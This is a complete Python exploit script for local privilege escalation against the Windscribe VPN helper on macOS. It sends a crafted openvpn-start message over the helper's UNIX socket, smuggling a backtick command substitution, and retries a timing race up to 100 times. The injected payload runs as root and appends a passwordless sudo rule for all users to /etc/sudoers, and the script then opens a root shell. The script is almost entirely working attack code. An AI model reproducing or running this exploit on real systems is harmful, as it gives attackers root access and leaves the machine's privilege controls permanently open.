#!/usr/bin/python3

import sys 
import os
import socket
import time
import struct
import shutil
import signal
import io


WINDSCRIBE_PATH = "/Applications/Windscribe.app/Contents/MacOS/Windscribe"
PAYLOAD_FILE = "/tmp/test.sh"
TOTAL_TRIES = 100

# play around with these if the race doesn't work,
# instructions are in the readme
CHILD_POST_SEND_WAIT_TIME = 0.01
PARENT_KILL_WAIT_TIME = 0.1

# this will run as root
#script_payload = "#!/bin/bash\nid > /tmp/pwned\n"
script_payload = "#!/bin/bash\nid > /tmp/pwned\necho -en \"\nALL ALL=(ALL) NOPASSWD:ALL\n\" >> /etc/sudoers\n"


# NOTE: generate with boosttest.cpp, will execute /tmp/test.sh
openvpn_start_data = [
	0x30, 0x20, 0x30, 0x20, 0x34, 0x36, 0x20, 0x2f, 0x41, 0x70, 0x70, 0x6c,
	0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x2f, 0x57, 0x69, 0x6e,
	0x64, 0x73, 0x63, 0x72, 0x69, 0x62, 0x65, 0x2e, 0x61, 0x70, 0x70, 0x2f,
	0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x73, 0x2f, 0x48, 0x65, 0x6c,
	0x70, 0x65, 0x72, 0x73, 0x2f, 0x20, 0x31, 0x37, 0x20, 0x77, 0x69, 0x6e,
	0x64, 0x73, 0x63, 0x72, 0x69, 0x62, 0x65, 0x6f, 0x70, 0x65, 0x6e, 0x76,
	0x70, 0x6e, 0x20, 0x34, 0x20, 0x43, 0x43, 0x43, 0x43, 0x20, 0x31, 0x34,
	0x20, 0x60, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x74, 0x65, 0x73, 0x74, 0x2e,
	0x73, 0x68, 0x60, 0x20, 0x30, 0x20, 0x30
]


def do_socket_send(client):
	# for testing, cmdid 0 is invalid
	#cmdid = 0
	#payload = b''
	
	# openvpn start
	cmdid = 1
	payload = bytearray(openvpn_start_data)
	pid = 0
	length = len(payload)

	header = bytearray()
	header += struct.pack("<i", cmdid)
	header += struct.pack("<I", pid)
	header += struct.pack("<I", length)

	packet = header + payload

	# print("DBG", packet.hex())

	# print("[+] Sending data")
	client.connect("/private/var/run/windscribe_helper_socket2")
	client.sendall(packet)



def main():
	print("[+] Preparing")
	if os.path.exists(PAYLOAD_FILE):
		os.unlink(PAYLOAD_FILE)
	f = open(PAYLOAD_FILE, "w")
	f.write(script_payload)
	os.fchmod(f.fileno(), 0o0755)
	f.close()

	print("[+] Opening windscribe log file")
	logfile = open("/Library/Logs/com.windscribe.helper.macos/helper_log.txt")
	logfile.seek(0, io.SEEK_END)
	logbuf = ""

	print("[+] Launching exploit")
	success = False
	for i in range(TOTAL_TRIES):
		print("[+] Try {}/{}". format(i, TOTAL_TRIES))
		pid = os.fork()
		if pid == 0:
			# open the socket here so it survives until execve()
			# print("[+] Connecting")
			client = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)

			# print("[+] Child sending data")
			do_socket_send(client)

			# don't be TOO fast
			time.sleep(CHILD_POST_SEND_WAIT_TIME)

			# print("[+] Child calling execve")
			args = [WINDSCRIBE_PATH]
			os.execve(args[0], args, env={})

			print("[-] Child's execve() failed")
			exit(0)

		time.sleep(PARENT_KILL_WAIT_TIME)
		os.kill(pid, signal.SIGKILL)
		os.waitpid(pid, 0)

		lines = logfile.readlines()
		for i in lines:
			print("[?] LOGLINE", i.strip())

		# don't rely on logfile
		if os.path.exists("/tmp/pwned"):
			print("[+] PWNED :)")
			success = True
			break

	if not success:
		print("[-] Failed to exploit")
		return 0
	
	print("[+] Spawning shell")
	args = ["/usr/bin/sudo", "/bin/bash"]
	os.execve(args[0], args, env={})

	print("[-] Shell spawning failed")


if __name__ == "__main__":
	main()

